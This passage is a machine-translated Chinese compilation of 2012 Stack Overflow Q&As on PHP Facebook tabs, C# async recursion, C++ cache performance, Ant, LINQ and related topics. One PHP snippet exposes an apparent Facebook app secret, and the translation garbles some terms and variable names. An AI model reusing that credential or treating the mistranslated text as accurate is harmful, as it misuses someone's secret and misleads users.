现在我们必须找到成本`T(n-1)`并将其添加到成本`T(n)=1`中。
我们猜测最终的结果是`N-1`。在这一步中，我们使用归纳法来证明我们的猜测。

**更新：**
T(n) 的成本为 1 （ T(1) 为零，加上将计算的 T(n-1) ，加上 1 => 1 ）， T(n-1) 的成本也是一（与同样的逻辑）。我们往下走 n-1 的深度。最后一个是 T(1)，它是零。（画一棵树，它会帮助你理解）。
这种猜测生长顺序的方法称为[递归树](http://www.cs.cornell.edu/courses/cs3110/2012sp/lectures/lec20-master/lec20.html)。现在你可以通过归纳来证明它。

有关如何应用归纳来证明假设的更多信息，请参阅[CLRS](https://rads.stackoverflow.com/amzn/click/com/0262033844)等教科书。

# php - Facebook 选项卡 - 粉丝门控 - 不显示类似内容

> ID：12264941
> 
> 赞同：0
> 
> 时间：2012-09-04T13:49:39.327
> 
> 标签：php, facebook, fan-page

我有这个 index.php，它告诉我要包含什么。我想在带有扇形门控选项的选项卡中拥有一个子页面。有人可以帮助我并告诉我我的代码有什么问题吗？我不是很喜欢 php。

```
 <?php

require 'src/facebook.php';

// Create our Application instance (replace this with your appId and secret).
$facebook = new Facebook(array(
  'appId' => '262995697152250',
  'secret' => '7ad8d22dc1b0224b4bb226d0085b4063',
));

$user = $facebook->getUser();

if ($user) {
  try {
    $likes = $facebook->api("/me/likes/286599224689000");
    if( !empty($likes['data']) )
        echo "I like!";
    else
        echo "not a fan!";
  } catch (FacebookApiException $e) {
    error_log($e);
    $user = null;
  }
}

if ($user) {
  $logoutUrl = $facebook->getLogoutUrl();
} else {
  $loginUrl = $facebook->getLoginUrl(array(
    'scope' => 'user_likes'
  ));
}

$signed_request = $facebook->getSignedRequest();

$page_id = $signed_request["page"]["id"];
$page_admin = $signed_request["page"]["admin"];
$like_status = $signed_request["page"]["liked"];
$country = $signed_request["user"]["country"];
$locale = $signed_request["user"]["locale"];

include ("header.php");
if(!isset($_GET['page'])) $_GET['page']="";
switch($_GET['page']) {
case "1": include('leftside.html'); include('informace.html'); break;
case "2": include('reference.html'); break;
case "3": include('clanky.html'); ;break;
case "4":
// If a fan is on your page
if ($like_status) {
include ("formular.html");
} else {
// If a non-fan is on your page
include ("nonfan.html");}
;break;

case "5": include('clanok1.html'); break;
case "6": include('clanok2.html'); break;
case "7": include('clanok3.html'); break;
case "8": include('clanok4.html'); break;
case "9": include('leftside.html'); include('vyhody.html'); break;

default: include('leftside.html'); include('informace.html');
}
include ("footer.html");
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:47:17.017

要将变量传递给页面选项卡，您必须使用**app_data**变量，该变量可以使用**signed_request**解码。请参阅此处： [将自定义参数传递给 facebook 粉丝页面选项卡](https://stackoverflow.com/questions/5019115/passing-custom-parameters-to-facebook-fan-page-tab)

# objective-c - Objective-c 从 json 字符串中提取单个值

> ID：12264943
> 
> 赞同：1
> 
> 时间：2012-09-04T13:49:42.017
> 
> 标签：objective-c, xcode, json

我有以下 json 返回字符串：

```
[{"status":2,"id":"-1","content":"User has entered wrong input","time":1346765646202}] 
```

（如您所见，结果位于包含单个对象的数组中）。

如何在没有枚举的情况下提取状态和内容的值？

现在我创建了一个字典并使用枚举运行它，但我不喜欢这个解决方案：

```
NSData *jsonData = [returnString dataUsingEncoding:NSUTF8StringEncoding];
NSDictionary *json = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:55:06.683

因为整个内容都包含在 [] 中，所以它将反序列化为一个 NSArray（大小为 1）（而不是您的代码所暗示的 NSDictionary）。该数组中的元素将是一个 NSDictionary ( `{}`)。`objectAtIndex:0`您可以使用并跳过您的枚举来获取该字典：

```
NSData *jsonData = [returnString dataUsingEncoding:NSUTF8StringEncoding];
NSArray *json = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
NSDictionary *response = [json objectAtIndex:0];
NSNumber *status = [response objectForKey:@"status"];
NSString *content = [response objectForKey:@"content"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:52:46.747

```
NSNumber * status = json[@"status"] 
```

或者

```
NSNumber * status = [json objectForKey: @"status"] 
```

等等

# mercurial - Mercurial Hg 远程操作性能

> ID：12264944
> 
> 赞同：1
> 
> 时间：2012-09-04T13:49:46.423
> 
> 标签：mercurial

我正在尝试使用 HTTP 和 SSH 在 Linux Red Hat 和 Windows 中使用 Mercurial 2.3 比较 hg 远程操作性能（拉、推、克隆）。我想我可以继续用 ruby​​ 或其他东西写一个脚本，但我懒得去做。任何人都知道任何用于测量克隆、推、拉时间的 hg 命令吗？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T14:44:30.683

您可以添加`--time`到您的`hg clone`,`hg push`和`hg pull`调用中，Mercurial 会告诉您操作花费了多少时间。

# c# - 使用等待异步进行流式读取

> ID：12264946
> 
> 赞同：2
> 
> 时间：2012-09-04T13:49:47.497
> 
> 标签：c#

我已经编写了以下方法来从一般的流中读取数据。在我的计算机上，它将是一个 MemoryStream，而在现实世界中，它将是一个网络流。

```
 public async void ReadAsync()
    {
        byte[] data = new byte[1024];
        int numBytesRead = await _stream.ReadAsync(data, 0, 1024);

        // Process data ...

        // Read again.
        ReadAsync();
    } 
```

这里的想法是数据在回调中得到处理，然后回调应该产生一个新的读取器线程（并杀死旧的）。然而，这不会发生。我得到一个 StackOverflowException。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-04T13:52:05.123

你有一个永无止境的[递归](http://en.wikipedia.org/wiki/Recursion)。

您一直在调用`ReadAsync()`并且永远不会从该方法返回（因此打破了无限递归）。

一个可能的解决方案是：

```
public async void ReadAsync()
{
    byte[] data = new byte[1024];
    int numBytesRead = await _stream.ReadAsync(data, 0, 1024);

    // Process data ...

    // Read again.
    if(numBytesRead > 0)
    {
        ReadAsync();
    }
} 
```

要更好地理解递归，[请检查此](https://stackoverflow.com/a/12264982/39106)。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-04T14:35:58.443

这里没有直接涉及线程（参见我对`async`/的介绍`await`）。

你`StackOverflowException`是由太深的递归引起的（通常是这样）。只需将方法重写为迭代即可：

```
public async Task ReadAsync()
{
  byte[] data = new byte[1024];

  while (true)
  {
    int numBytesRead = await _stream.ReadAsync(data, 0, 1024);
    if (numBytesRead == 0)
      return;

    // Process data ...
  }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-04T13:54:12.020

您至少需要检查流中是否有数据，重复操作或您的递归永远不会停止

```
// Read again.
if(numBytesRead != 0)
    ReadAsync(); 
```

# python - django sweetpie 更新两个模型

> ID：12264949
> 
> 赞同：2
> 
> 时间：2012-09-04T13:49:55.057
> 
> 标签：python, django, tastypie

我有一个关于通过一个（POST）api调用更新两个模型的问题。

我们有两个模型，一个用户模型和一个引用用户模型的候选模型。我们想通过 api 接口发布候选模型，但想隐藏用户模型。因此，作为第一步，我将用户模型字段与脱水过程中的候选模型字段合并。这工作得很好。

问题是，我不知道如何反过来（水合并创建两个模型。我们需要创建一个单独的用户模型，不能只合并两个模型）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-05T01:41:30.353

如果您向我们展示一些代码以及您尝试过什么，那就太好了，但是对于这种任务，您可能应该覆盖类的`obj_create(...)`方法`tastypie.resources.ModelResource`。

它看起来像这样：

```
 def obj_create(self, bundle, request=None, **kwargs):
        """
        A ORM-specific implementation of ``obj_create``.
        """
        bundle.obj = self._meta.object_class()

        for key, value in kwargs.items():
            setattr(bundle.obj, key, value)

        bundle = self.full_hydrate(bundle)

        # Save FKs just in case.
        self.save_related(bundle)

        # Save the main object.
        bundle.obj.save()

        # Now pick up the M2M bits.
        m2m_bundle = self.hydrate_m2m(bundle)
        self.save_m2m(m2m_bundle)
        return bundle 
```

因此，在您的资源中，您可能会有以下内容：

```
from tastypie.resources import ModelResource

class MyResource( ModelResource ):

    def obj_create( self, bundle, request = None, **kwargs ):
        # ...
        # create User instance based on what's in the bundle
        # user = ...
        # ...
        # kwargs[ 'user' ] = user < will be set on Candidate instance in super()
        # ...

        # call super, resulting in creation of the Candidate model
        super( MyResource, self ).obj_create( self, bundle, request, **kwargs ) 
```

这应该让你开始。如果您有任何问题，请提出问题并提供一些代码。

# .htaccess - 从 .htaccess 规则中排除带有 get 参数的请求

> ID：12264952
> 
> 赞同：2
> 
> 时间：2012-09-04T13:50:04.193
> 
> 标签：.htaccess

我有这个 htaccess 规则：

```
RewriteCond %{REQUEST_URI} !assets
RewriteRule \.(?:jpe?g|gif|png)$ script.php 
```

它将所有图像请求重定向到`script.php`. 我想排除所有包含 GET 参数的请求，例如`http://myweb.com/image.jpg?process=0`但已`http://myweb.com/image.jpg`包含。

我应该如何编辑我的规则？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:09:41.773

然后你应该测试`%{QUERY_STRING}`if 确实包含一些东西：

```
RewriteCond %{REQUEST_URI} !assets
RewriteCond %{QUERY_STRING} !.+
RewriteRule \.(?:jpe?g|gif|png)$ script.php 
```

# javascript - 为什么我要将函数添加到对象原型而不是将其添加到对象？

> ID：12264955
> 
> 赞同：2
> 
> 时间：2012-09-04T13:50:11.600
> 
> 标签：javascript

有人问我这个问题，我有点迷茫。

由于这是一个问答，所以在这里提问是有意义的。

为什么我要将函数添加到对象原型而不是将其添加到对象？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:51:59.703

因为，如果将它添加到原型中，它将在对象的所有“实例”上可用。如果您将它添加到对象本身，它将仅在该单个实例上可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T13:58:18.417

考虑这两个对象：

## 对象 1

```
var myObject1 = function() {
    this.myProperty = true;
    this.myMethod = function() {
        return this.myProperty;
    };
} 
```

## 对象 2

```
var myObject2 = function() {
   this.myProperty = true;
}

myObject2.prototype.myMethod = function() {
    return this.myProperty;
}; 
```

每次我们这样做：

```
var test = new myObject1(); 
```

myObject1.myMethod 也被创建。当我们这样做时：

```
var test = new myObject2(); 
```

myObject2.myMethod 没有需要再次创建的开销，因为它已添加到原型链中。

这对于少数情况无关紧要，但在游戏中，例如，可能有数百个实例，这可能会对性能造成很大影响。

* * *

这篇 net.tutsplus 文章可能比我解释得更好[http://net.tutsplus.com/tutorials/javascript-ajax/prototypes-in-javascript-what-you-need-to-know/](http://net.tutsplus.com/tutorials/javascript-ajax/prototypes-in-javascript-what-you-need-to-know/)

# class - 在 ant 脚本中包括作为类文件分发的库

> ID：12264967
> 
> 赞同：1
> 
> 时间：2012-09-04T13:51:19.173
> 
> 标签：class, ant, java

我目前正在尝试使用 ant 编译一个项目，该项目使用许多作为 .class 文件分发的外部库（特别是 apache.hwpf 和 JDom2）。

我目前正在使用 eclipse 来编辑和构建项目，但我想切换到使用 ant 文件，因为它应该更易于维护（不需要特定版本的 eclipse），并且更易于构建（只需运行“ant build”或其他东西。

问题是，我不确定应该将库包含在 ant 文件中的哪个位置。我当前的 ant 文件（见下文）总是在 javac 阶段失败，所以我认为它应该在那里。这通常是因为它找不到像“元素”这样的东西，这是一个由 JDom2 库定义的类。

有人可以解释我应该在哪里导入它，以及如何导入。

（编辑：作为附录，我想要获得的功能类似于在 Eclipse 中的项目属性中的构建路径的库选项卡下添加一个类文件夹。这目前适用于构建我的项目，但我想移动如果可能的话，远离日食。）

（编辑：进一步澄清；我在 Eclipse 中通过 Project->Properties->Java Build Path->Libraries->Add Class Folder 做什么，我希望能够使用 ant。）

到目前为止，我的蚂蚁脚本是：

```
<project>
    <property name="src.dir" value="src"/>
    <property name="lib.dir" value="lib"/>
    <property name="build.dir" value="build"/>
    <property name="classes.dir" value="${build.dir}/classes"/>
    <property name="jar.dir" value="${build.dir}/jar"/>
    <property name="main-class" value="ba_cc.Main"/>

    <target name="clean">
        <delete dir="${build.dir}"/>
    </target>

    <target name="compile">
        <mkdir dir="${classes.dir}"/>
        <javac srcdir="${src.dir}" destdir="${classes.dir}"/>
    </target>

    <target name="jar">
        <mkdir dir="${jar.dir}"/>
        <jar destfile="${jar.dir}/Change_Checker.jar" basedir="${classes.dir}">
            <manifest>
                <attribute name="Main-Class" value="${main-class}"/>
            </manifest>
        </jar>
    </target>

    <target name="run">
        <java jar="${jar.dir}/Change_Checker.jar" fork="true"/>
    </target>

    <target name="clean-build" depends="clean,compile,jar"/>

    <target name="main" depends="clean,run"/>
</project> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:09:18.427

您的 ant 构建中的`javac`任务根本没有引用您的第三方类。要解决这个问题，您需要在类路径中专门引用它们。处理此问题的最佳方法是设置一个`project.class.path`属性，并使用任务的`classpath`or`classpathref`属性引用该属性`javac`。

这是一个例子`project.class.path`。我假设*lib.dir*将包含您的第三方 jar 或类：

```
<path id="project.class.path">
  <fileset dir="${lib.dir}"/>
  <pathelement location="${src.dir}"/>
  <pathelement location="${classes.dir}"/>
</path> 
```

`pathelement`或者，您可以使用更多属性专门提供单个 jar 文件：

```
<path id="project.class.path">
  <pathelement location="${lib.dir}/JDom2.jar"/>
  <pathelement location="${lib.dir}/AnotherSupportLibrary.jar"/>
  ... 
```

现在，在你的`compile`任务中：

```
<target name="compile">
    <mkdir dir="${classes.dir}"/>
    <javac srcdir="${src.dir}" destdir="${classes.dir}"
           classpath="${project.class.path}"/>
</target> 
```

现在，您还需要在构建的 jar 中包含第三方库。该`jar`任务提供了将支持 jar 的内容合并到正在构建的 jar 中的规定，请参阅[jar 任务文档中](http://ant.apache.org/manual/Tasks/jar.html)*Merging Archives*下的描述。

此外，您应该阅读文档并仔细查看[javac 任务](http://ant.apache.org/manual/Tasks/javac.html)的示例，还应查看[编写简单](http://ant.apache.org/manual/using.html)的构建文件，最后要设置更复杂的类路径，请查看[基于目录的任务](http://ant.apache.org/manual/dirtasks.html#directorybasedtasks)的文档。

# c# - 来自 IP 摄像机 HttpWebRequest 的 Aforge 实时流

> ID：12264968
> 
> 赞同：1
> 
> 时间：2012-09-04T13:51:22.743
> 
> 标签：c#, aforge, ip-camera

我正在使用 Aforge 尝试从 IP 摄像机获取实时流。我的问题是，我的连接由于某种原因不断关闭。出于测试目的，我将相机直接连接到我的计算机并通过此 LAN 连接到它。

错误：

> 基础连接已关闭：连接意外关闭。

这是我正在使用的代码：

```
stream.NewFrame += new NewFrameEventHandler(video_NewFrame);
stream.VideoSourceError += new VideoSourceErrorEventHandler(stream_VideoSourceError);
stream.Login = "login";
stream.Password = "pass";
stream.RequestTimeout = 10000;
stream.Source = "http://192.168.0.33/nphMotionJpeg?Resolution=320x240&Quality=Standard";  
stream.Start(); 
```

我看到有些人建议在 app.config 中进行设置，我也这样做了：

```
<system.net>
  <settings>
    <httpWebRequest useUnsafeHeaderParsing="true"/>
  </settings>
</system.net> 
```

如果没有编辑 app.config，我会得到一个不同的错误。（违反协议）

有没有人遇到过这些问题或知道如何让它工作？

**注意：我也尝试过**[像这样](http://www.codeproject.com/Articles/15537/Camera-Vision-video-surveillance-on-C)在没有 Aforge 的情况下获取数据，但它导致了同样的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T17:05:28.123

尝试以下操作，看看它是否有效。

```
stream.Login = "login";
stream.Password = "pass";
stream.ForceBasicAuthentication = true;
stream.RequestTimeout = 10000;
stream.Source = "http://192.168.0.33/nphMotionJpeg?Resolution=320x240&Quality=Standard";  
stream.Start(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T21:11:40.303

我不相信这是 aforge 中的一个选项（[https://code.google.com/p/aforge/source/browse/trunk/Sources/Video/MJPEGStream.cs](https://code.google.com/p/aforge/source/browse/trunk/Sources/Video/MJPEGStream.cs)），但看起来相机需要 HTTP v1。 0。请参阅手册[http://csj.psn-web.net/netwkcam_net/download/us/document/NEW_Camera_CGI_Interface_v4.30.pdf](http://csj.psn-web.net/netwkcam_net/download/us/document/NEW_Camera_CGI_Interface_v4.30.pdf)第 56 页。

> (1) 开始接收 建立连接（打开套接字），并将以下命令字符串发送到 HTTP 端口。"GET http://xxx.xxx.xxx.xxx:yy/nphMotionJpeg?Resolution=320x240&Quality=Standard **HTTP/1.0\r\n** " xxx.xxx.xxx.xxx：IP地址或域名yy：HTTP端口号。（如果端口号设置为 80，则不需要）

如果您确实可以访问代码，则可以尝试

```
//setting http v1.0 in c#
HttpWebRequest request = (HttpWebRequest)base.GetWebRequest(address);
request.ProtocolVersion = HttpVersion.Version10; 
```

另外，尝试启用访客访问并从代码中删除您的用户名/密码，看看是否有效。

# c++ - 为什么我的程序在恰好循环 8192 个元素时很慢？

> ID：12264970
> 
> 赞同：780
> 
> 时间：2012-09-04T13:51:31.017
> 
> 标签：c++, performance, memory-management, gcc

这是相关程序的摘录。矩阵`img[][]`的大小为 SIZE×SIZE，初始化为：

`img[j][i] = 2 * j + i`

然后，你做一个矩阵`res[][]`，这里的每个字段都是img矩阵中它周围9个字段的平均值。为简单起见，边框保留为 0。

```
for(i=1;i<SIZE-1;i++) 
    for(j=1;j<SIZE-1;j++) {
        res[j][i]=0;
        for(k=-1;k<2;k++) 
            for(l=-1;l<2;l++) 
                res[j][i] += img[j+l][i+k];
        res[j][i] /= 9;
} 
```

这就是程序的全部内容。为了完整起见，这里是之前的内容。后面没有代码。如您所见，这只是初始化。

```
#define SIZE 8192
float img[SIZE][SIZE]; // input image
float res[SIZE][SIZE]; //result of mean filter
int i,j,k,l;
for(i=0;i<SIZE;i++) 
    for(j=0;j<SIZE;j++) 
        img[j][i] = (2*j+i)%8196; 
```

基本上，当 SIZE 是 2048 的倍数时，这个程序很慢，例如执行时间：

```
SIZE = 8191: 3.44 secs
SIZE = 8192: 7.20 secs
SIZE = 8193: 3.18 secs 
```

编译器是 GCC。据我所知，这是因为内存管理，但我对这个主题并不太了解，这就是我在这里问的原因。

另外如何解决这个问题会很好，但如果有人能解释这些执行时间，我已经很高兴了。

我已经知道 malloc/free，但问题不在于使用的内存量，而只是执行时间，所以我不知道这会有什么帮助。

* * *

## 回答 #1

> 赞同：986
> 
> 时间：2012-09-04T14:43:25.417

差异是由以下相关问题中的相同超级对齐问题引起的：

*   [为什么转置 512x512 的矩阵比转置 513x513 的矩阵慢得多？](https://stackoverflow.com/q/11413855/922184)
*   [矩阵乘法：矩阵大小差异小，时序差异大](https://stackoverflow.com/q/7905760/922184)

但这只是因为代码还有另一个问题。

从原始循环开始：

```
for(i=1;i<SIZE-1;i++) 
    for(j=1;j<SIZE-1;j++) {
        res[j][i]=0;
        for(k=-1;k<2;k++) 
            for(l=-1;l<2;l++) 
                res[j][i] += img[j+l][i+k];
        res[j][i] /= 9;
} 
```

首先注意两个内部循环是微不足道的。它们可以按如下方式展开：

```
for(i=1;i<SIZE-1;i++) {
    for(j=1;j<SIZE-1;j++) {
        res[j][i]=0;
        res[j][i] += img[j-1][i-1];
        res[j][i] += img[j  ][i-1];
        res[j][i] += img[j+1][i-1];
        res[j][i] += img[j-1][i  ];
        res[j][i] += img[j  ][i  ];
        res[j][i] += img[j+1][i  ];
        res[j][i] += img[j-1][i+1];
        res[j][i] += img[j  ][i+1];
        res[j][i] += img[j+1][i+1];
        res[j][i] /= 9;
    }
} 
```

这样就剩下我们感兴趣的两个外循环了。

现在我们可以看到这个问题的问题是相同的：[为什么在迭代二维数组时循环的顺序会影响性能？](https://stackoverflow.com/q/9936132/922184)

您正在逐列而不是逐行迭代矩阵。

* * *

要解决这个问题，您应该交换两个循环。

```
for(j=1;j<SIZE-1;j++) {
    for(i=1;i<SIZE-1;i++) {
        res[j][i]=0;
        res[j][i] += img[j-1][i-1];
        res[j][i] += img[j  ][i-1];
        res[j][i] += img[j+1][i-1];
        res[j][i] += img[j-1][i  ];
        res[j][i] += img[j  ][i  ];
        res[j][i] += img[j+1][i  ];
        res[j][i] += img[j-1][i+1];
        res[j][i] += img[j  ][i+1];
        res[j][i] += img[j+1][i+1];
        res[j][i] /= 9;
    }
} 
```

这完全消除了所有非顺序访问，因此您不再会因大的二次幂而随机减速。

* * *

**酷睿 i7 920 @ 3.5 GHz**

原始代码：

```
8191: 1.499 seconds
8192: 2.122 seconds
8193: 1.582 seconds 
```

互换外环：

```
8191: 0.376 seconds
8192: 0.357 seconds
8193: 0.351 seconds 
```

* * *

## 回答 #2

> 赞同：57
> 
> 时间：2012-09-04T17:00:36.953

以下测试是使用 Visual C++ 编译器完成的，因为它被默认的 Qt Creator 安装使用（我猜没有优化标志）。使用 GCC 时，Mystical 的版本和我的“优化”代码没有太大区别。所以结论是编译器优化比人类更好地处理微优化（最后是我）。我将剩下的答案留作参考。

* * *

以这种方式处理图像效率不高。最好使用一维数组。处理所有像素是在一个循环中完成的。可以使用以下方法随机访问点：

```
pointer + (x + y*width)*(sizeOfOnePixel) 
```

在这种特殊情况下，最好水平计算和缓存三个像素组的总和，因为每个像素组使用了 3 次。

我做了一些测试，我认为值得分享。每个结果是五次测试的平均值。

user1615209的原始代码：

```
8193: 4392 ms
8192: 9570 ms 
```

神秘的版本：

```
8193: 2393 ms
8192: 2190 ms 
```

使用一维数组的两遍：第一遍用于水平总和，第二遍用于垂直总和和平均值。使用三个指针进行两遍寻址，并且仅像这样递增：

```
imgPointer1 = &avg1[0][0];
imgPointer2 = &avg1[0][SIZE];
imgPointer3 = &avg1[0][SIZE+SIZE];

for(i=SIZE;i<totalSize-SIZE;i++){
    resPointer[i]=(*(imgPointer1++)+*(imgPointer2++)+*(imgPointer3++))/9;
}

8193: 938 ms
8192: 974 ms 
```

两遍使用一维数组并像这样寻址：

```
for(i=SIZE;i<totalSize-SIZE;i++){
    resPointer[i]=(hsumPointer[i-SIZE]+hsumPointer[i]+hsumPointer[i+SIZE])/9;
}

8193: 932 ms
8192: 925 ms 
```

一次缓存水平总和仅向前一行，因此它们保留在缓存中：

```
// Horizontal sums for the first two lines
for(i=1;i<SIZE*2;i++){
    hsumPointer[i]=imgPointer[i-1]+imgPointer[i]+imgPointer[i+1];
}
// Rest of the computation
for(;i<totalSize;i++){
    // Compute horizontal sum for next line
    hsumPointer[i]=imgPointer[i-1]+imgPointer[i]+imgPointer[i+1];
    // Final result
    resPointer[i-SIZE]=(hsumPointer[i-SIZE-SIZE]+hsumPointer[i-SIZE]+hsumPointer[i])/9;
}

8193: 599 ms
8192: 652 ms 
```

结论：

*   使用多个指针和增量没有任何好处（我认为它会更快）
*   缓存水平总和比多次计算要好。
*   两次通过不是快三倍，只有两次。
*   使用单次传递和缓存中间结果可以实现 3.6 倍的速度

我确信可以做得更好。

**注意** 请注意，我写这个答案是为了解决一般性能问题，而不是 Mystical 的优秀答案中解释的缓存问题。一开始它只是伪代码。我被要求在评论中进行测试......这是一个完全重构的带有测试的版本。

# android - Android：在 SDK 中找不到想要的 API 级别

> ID：12264973
> 
> 赞同：0
> 
> 时间：2012-09-04T13:51:41.430
> 
> 标签：android, sdk

晚上好！

我的 SDK 有问题。我想安装在 API14（Android 4.0）中找到的 ARM EABI，但是，当我尝试转到 Android SDK 管理器时，它最多只能加载 15 个，但完全跳过 API14。我该如何补救？

![在此处输入图像描述](../Images/1532ba6a0b185a9588d52e42425e7860.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:13:13.313

试试这个，在你的 Android SDK 管理器**菜单**上：

*   包>>显示更新/新包；显示过时的包；

*   工具>>管理附加站点：==>勾选所有来源（尤其是谷歌）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:01:24.920

在屏幕截图中，它甚至没有完成加载，只显示已安装的。

确保 Tools --> Manage Add-on Sites 下的 URLS 都已启用，并让它获取所有内容。Android 系统映像的当前 URL 是

`https://dl-ssl.google.com/android/repository/sys-img.xml`

否则，您可能在连接到谷歌服务器时遇到问题。

无论如何，您的 SDK 工具都不是最新的，因此您可能也想更新它们并检查您是否仍然无法从谷歌服务器获取任何信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:01:59.167

你的 /platform-tools/source.properties 里有什么？？？

```
Pkg.Revision=14
Archive.Arch=ANY
Pkg.SourceUrl=https\://dl-ssl.google.com/android/repository/repository-7.xml 
```

# java - 如何将不同的对象表示反序列化为 POJO？

> ID：12264974
> 
> 赞同：1
> 
> 时间：2012-09-04T13:51:43.887
> 
> 标签：java, json, spring, rest, jackson

在客户端上，我有一个在实体上运行的 Javascript 应用程序，其中一些被包装对象引用，该对象包含服务器端实例的唯一键 - 基本上是某种引用。有些是按原样处理的，所有实体字段都存在。

当我发送带有修改的实体以将其保存在服务器上时，一些本身是实体的字段是引用，而有些是完整的对象。

例如，假设我有 Car、CarModel 和 Garage，传入的 JSON 可能如下所示：

```
{
    addedItems: [{
        "@class": "mydoamin.Car",
        belongsTo: {
            "key": "Unique_Garage_Key"
        },
        carModel: {
            name: "New Car Model",
            wheelSize: 14,
            doors: 5
        }
    },{
        "@class": "mydomain.Car",
        belongsTo: {
            "name": "New Garage"
        },
        carModel: {
            key: "Unique_Key_Of_Existing_Car_Model"
        }
    }]
} 
```

为了在服务器部分工作，我需要一个灵活的反序列化器，它可以将两种格式反序列化为相应的域 POJO。

根据我从杰克逊文档中获得的信息，我启动了一个反序列化器，但我不知道如何正确编写它。我在反序列化器中得到的是 JsonParser 和 DeserializationContext。而且我认为可以通过两次解析流来实现，首先是作为包装对象，如果失败，请尝试将其作为域对象读取。不幸的是，我看不到 JsonParser 可以做到这一点。

所以基本上我的反序列化方法是：

```
Car car;
try { 
    Wrapper carRef = jp.readValueAs(Wrapper.class);
    car = wrapper.unwrap(carRef);
} catch (Exception e) {
    // rewind the stream somehow...
    car = jp.readValueAs(Car.class);
} 
```

有人可以评论一下 JsonParser 是否可行，以及如何完成这个反序列化案例的更好想法？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T15:18:11.117

TreeTraversingParser 解决了这个问题。

```
 JsonNode rootEntityNode = jp.readValueAsTree();
        TreeTraversingParser treeTraversingParser = new TreeTraversingParser(rootEntityNode, jp.getCodec()); 
```

在此之后，您可以分析解析的 JsonNode 的类型并使用正确的反序列化。

# c# - Linq 和总和

> ID：12264976
> 
> 赞同：3
> 
> 时间：2012-09-04T13:51:49.353
> 
> 标签：c#, linq, sum

下面有一段简单的代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace LinqStuff
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var aS = new List<A>();
            aS.Add(new A { aId = 0 });
            aS.Add(new A { aId = 1 });

        var bs = new List<B>();
        bs.Add(new B { aId = 0, bId = 0 });
        bs.Add(new B { aId = 0, bId = 1 });

        var cs = new List<C>();
        cs.Add(new C { bId = 0, cId = 0, Val = 100 });
        cs.Add(new C { bId = 0, cId = 1, Val = 100 });
        cs.Add(new C { bId = 1, cId = 2, Val = 100 });
        cs.Add(new C { bId = 1, cId = 3, Val = 100 });

    }
}

internal class A
{
    public int aId { get; set; }
}

internal class B
{
    public int aId { get; set; }
    public int bId { get; set; }
}

internal class C
{
    public int bId { get; set; }
    public int cId { get; set; }
    public int Val { get; set; }
} 
```

}

我想做的是让 alinq 带回 2 个这样的匿名对象：

第一：（援助 = 1，总和 = 0） 第二：（援助 = 0，总和 = 400）

Sum 是通过 B 与 A 链接的所有对象 C 的总和。

我尝试使用 SelectMany，但我没有得到比返回 5 对（A，C）更进一步，我需要稍后对其执行分组。

例如

```
 var result = aS.SelectMany(a => bs.Where(b => b.aId == a.aId).DefaultIfEmpty(),
                                        (a, b) => new { A = a, B = b })
                            .SelectMany(b => cs.Where(c => b != null && b.B != null && c.bId == b.B.bId).DefaultIfEmpty(),
                                        (b, c) => new { A = b.A, C = c }) 
```

有东西不见了，你能帮帮我吗？

干杯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:07:25.417

不是最漂亮的 Linq 语句，但应该这样做；

```
var result = aS.Select(a => 
  new { a.aId, 
        sum = cs.Where(c => bs.Where(b => b.aId == a.aId)
                .Select(b => b.bId)
                .Contains(c.bId))
                .Sum(c => c.Val) 
      }).ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T16:17:26.780

```
var results = from a in aS
              let matchingBIds = bS.Where(b => b.aId == a.aId).Select(b => b.bId)
              let matchingCs = cS.Where(c => matchingBIds.Contains(c.bId))
              let Sum = matchingCs.Sum(c => c.Val)
              select new { a.aId, Sum }; 
```

# .net - svn 钩子是否因为 .NET 而读取 vbs、ruby、... 脚本？

> ID：12264980
> 
> 赞同：2
> 
> 时间：2012-09-04T13:52:02.483
> 
> 标签：.net, svn, version-control, vbscript, svn-hooks

我是 .NET 世界的新手，我想澄清一下我的理解。

SVN 挂钩能够读取 Ruby 或 Visual Basic 脚本等的原因是因为挂钩是在 .NET 框架下编译的吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T18:52:58.053

根据[Docs](http://svnbook.red-bean.com/en/1.1/ch05s02.html)，每个可执行文件都可以用于挂钩：

> 在 Unix 平台上，这意味着提供与钩子名称完全相同的脚本或程序（可以是 shell 脚本、Python 程序、编译的 C 二进制文件或任何数量的其他东西）。当然，模板文件的存在不仅仅是为了提供信息——在 Unix 平台上安装钩子的最简单方法是简单地将适当的模板文件复制到一个没有 .tmpl 扩展名的新文件中，自定义钩子的内容，然后确保脚本是可执行的。但是，Windows 使用文件扩展名来确定程序是否可执行，因此您需要提供一个程序，其基本名称是钩子的名称，并且其扩展名是 Windows 识别的可执行程序的特殊扩展名之一，例如 .exe 或 .com 用于程序，以及 .

所以简短的回答是：不。

# django - Django：不同的测试用例结构

> ID：12264984
> 
> 赞同：1
> 
